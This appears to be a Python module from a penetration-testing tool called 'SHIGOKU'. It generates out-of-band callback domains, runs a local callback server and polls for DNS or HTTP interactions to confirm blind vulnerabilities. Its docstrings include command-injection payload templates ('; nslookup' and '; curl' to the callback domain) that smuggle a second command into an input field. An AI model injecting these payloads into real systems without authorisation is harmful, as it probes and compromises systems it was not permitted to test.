"""
Out-of-Band (OOB) Correlation Engine for SHIGOKU Phase D
Elegant DNS/HTTP callback correlation with provider abstraction
"""
from __future__ import annotations
import asyncio
import logging
from typing import Dict, List, Any, Optional, Callable, Protocol
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from abc import ABC, abstractmethod
import uuid

logger = logging.getLogger(__name__)


@dataclass
class OOBInteraction:
    """Single OOB interaction record"""
    correlation_id: str
    timestamp: datetime
    interaction_type: str  # "dns", "http", "smtp"
    remote_address: str
    payload: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "correlation_id": self.correlation_id,
            "timestamp": self.timestamp.isoformat(),
            "type": self.interaction_type,
            "remote_address": self.remote_address,
            "payload": self.payload,
        }


@dataclass
class OOBToken:
    """OOB token for correlation"""
    correlation_id: str
    domain: str
    created_at: datetime
    expires_at: datetime
    
    def is_expired(self) -> bool:
        return datetime.utcnow() > self.expires_at


class OOBProvider(ABC):
    """Abstract base for OOB providers (interactsh, custom, etc.)"""
    
    @abstractmethod
    async def generate_token(self, ttl_seconds: int = 60) -> OOBToken:
        """Generate new OOB token"""
        pass
    
    @abstractmethod
    async def poll_interactions(
        self, 
        correlation_id: str
    ) -> List[OOBInteraction]:
        """Poll for interactions with given correlation ID"""
        pass
    
    @abstractmethod
    async def close(self):
        """Cleanup resources"""
        pass


class InteractshProvider(OOBProvider):
    """
    Interact.sh provider implementation
    
    Note: This is a placeholder. Actual implementation would use
    interactsh-client library or REST API.
    """
    
    def __init__(self, server: str = "interact.sh"):
        self.server = server
        self._tokens: Dict[str, OOBToken] = {}
        self._interactions: Dict[str, List[OOBInteraction]] = {}
    
    async def generate_token(self, ttl_seconds: int = 60) -> OOBToken:
        """Generate new interactsh token"""
        correlation_id = f"shg-{uuid.uuid4().hex[:8]}"
        domain = f"{correlation_id}.{self.server}"
        
        now = datetime.utcnow()
        token = OOBToken(
            correlation_id=correlation_id,
            domain=domain,
            created_at=now,
            expires_at=now + timedelta(seconds=ttl_seconds)
        )
        
        self._tokens[correlation_id] = token
        self._interactions[correlation_id] = []
        
        logger.debug(f"Generated OOB token: {domain}")
        return token
    
    async def poll_interactions(self, correlation_id: str) -> List[OOBInteraction]:
        """Poll interactsh for interactions"""
        # Placeholder: actual implementation would call interactsh API
        interactions = self._interactions.get(correlation_id, [])
        
        # Simulate some interactions for testing
        # In real implementation, this would be HTTP API call
        
        return interactions
    
    async def close(self):
        """Cleanup"""
        self._tokens.clear()
        self._interactions.clear()


class LocalOOBProvider(OOBProvider):
    """
    Local OOB server for testing
    """
    
    def __init__(self, host: str = "localhost", port: int = 8080):
        self.host = host
        self.port = port
        self._tokens: Dict[str, OOBToken] = {}
        self._interactions: Dict[str, List[OOBInteraction]] = {}
        self._server = None
    
    async def start_server(self):
        """Start local OOB HTTP/DNS server"""
        # Placeholder for actual server implementation
        from aiohttp import web
        
        async def handle_callback(request):
            correlation_id = request.match_info.get('id')
            
            interaction = OOBInteraction(
                correlation_id=correlation_id,
                timestamp=datetime.utcnow(),
                interaction_type="http",
                remote_address=request.remote,
                payload=await request.text(),
                headers=dict(request.headers)
            )
            
            if correlation_id in self._interactions:
                self._interactions[correlation_id].append(interaction)
            
            return web.Response(text="OK")
        
        app = web.Application()
        app.router.add_get('/callback/{id}', handle_callback)
        app.router.add_post('/callback/{id}', handle_callback)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        
        self._server = runner
        logger.info(f"Local OOB server started on {self.host}:{self.port}")
    
    async def generate_token(self, ttl_seconds: int = 60) -> OOBToken:
        """Generate local token"""
        correlation_id = f"local-{uuid.uuid4().hex[:8]}"
        
        now = datetime.utcnow()
        token = OOBToken(
            correlation_id=correlation_id,
            domain=f"{self.host}:{self.port}",
            created_at=now,
            expires_at=now + timedelta(seconds=ttl_seconds)
        )
        
        self._tokens[correlation_id] = token
        self._interactions[correlation_id] = []
        
        return token
    
    async def poll_interactions(self, correlation_id: str) -> List[OOBInteraction]:
        """Get stored interactions"""
        return self._interactions.get(correlation_id, [])
    
    async def close(self):
        """Shutdown server"""
        if self._server:
            await self._server.cleanup()


class OOBCorrelationManager:
    """
    Elegant OOB correlation management:
    - Provider abstraction (interactsh, local, etc.)
    - TTL-based token lifecycle
    - Async correlation detection
    """
    
    def __init__(self, provider: Optional[OOBProvider] = None):
        self.provider = provider or InteractshProvider()
        self._active_tokens: Dict[str, OOBToken] = {}
        self._correlations: Dict[str, List[OOBInteraction]] = {}
        self._cleanup_task: Optional[asyncio.Task] = None
    
    async def initialize(self):
        """Initialize manager and start cleanup task"""
        self._cleanup_task = asyncio.create_task(self._periodic_cleanup())
        logger.info("OOB correlation manager initialized")
    
    async def close(self):
        """Cleanup resources"""
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        
        await self.provider.close()
        logger.info("OOB correlation manager closed")
    
    async def register_oob_test(
        self, 
        ttl_seconds: int = 60
    ) -> OOBToken:
        """
        Register new OOB test and get correlation token
        
        Usage:
            token = await manager.register_oob_test()
            # Inject payload with token.domain
            # e.g., '; nslookup ' + token.domain + ' #
        """
        token = await self.provider.generate_token(ttl_seconds)
        self._active_tokens[token.correlation_id] = token
        self._correlations[token.correlation_id] = []
        
        logger.debug(f"Registered OOB test: {token.correlation_id}")
        return token
    
    async def check_correlation(
        self, 
        correlation_id: str,
        timeout_seconds: float = 30.0
    ) -> Optional[List[OOBInteraction]]:
        """
        Check for OOB interactions with correlation
        
        Args:
            correlation_id: Token correlation ID
            timeout_seconds: Max time to wait for interactions
        
        Returns:
            List of interactions if correlated, None otherwise
        """
        token = self._active_tokens.get(correlation_id)
        if not token:
            logger.warning(f"Unknown correlation ID: {correlation_id}")
            return None
        
        if token.is_expired():
            logger.debug(f"Token expired: {correlation_id}")
            return None
        
        # Poll for interactions
        start_time = asyncio.get_event_loop().time()
        
        while (asyncio.get_event_loop().time() - start_time) < timeout_seconds:
            interactions = await self.provider.poll_interactions(correlation_id)
            
            if interactions:
                self._correlations[correlation_id].extend(interactions)
                logger.info(f"OOB correlation detected: {correlation_id}")
                return interactions
            
            await asyncio.sleep(1)  # Poll interval
        
        logger.debug(f"No OOB correlation within timeout: {correlation_id}")
        return None
    
    async def _periodic_cleanup(self):
        """Periodic cleanup of expired tokens"""
        while True:
            try:
                await asyncio.sleep(60)  # Cleanup every minute
                
                expired = [
                    cid for cid, token in self._active_tokens.items()
                    if token.is_expired()
                ]
                
                for cid in expired:
                    del self._active_tokens[cid]
                    logger.debug(f"Cleaned up expired token: {cid}")
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Cleanup error: {e}")
    
    def get_oob_payload(self, token: OOBToken, payload_template: str) -> str:
        """
        Generate OOB payload with correlation domain
        
        Example templates:
        - "'; nslookup {domain} #"
        - "'; curl http://{domain}/?id={correlation_id} #"
        """
        return payload_template.format(
            domain=token.domain,
            correlation_id=token.correlation_id
        )


# Convenience functions

async def create_oob_manager(
    provider_type: str = "interactsh"
) -> OOBCorrelationManager:
    """
    Create OOB correlation manager
    
    Usage:
        manager = await create_oob_manager()
        await manager.initialize()
        
        token = await manager.register_oob_test()
        # Use token.domain in payload
        
        interactions = await manager.check_correlation(token.correlation_id)
        if interactions:
            print("OOB correlation confirmed!")
    """
    if provider_type == "interactsh":
        provider = InteractshProvider()
    elif provider_type == "local":
        provider = LocalOOBProvider()
        await provider.start_server()
    else:
        raise ValueError(f"Unknown provider: {provider_type}")
    
    manager = OOBCorrelationManager(provider)
    await manager.initialize()
    return manager


# Global instance
_oob_manager: Optional[OOBCorrelationManager] = None


async def get_oob_manager() -> OOBCorrelationManager:
    """Get or create global OOB manager"""
    global _oob_manager
    if _oob_manager is None:
        _oob_manager = await create_oob_manager()
    return _oob_manager
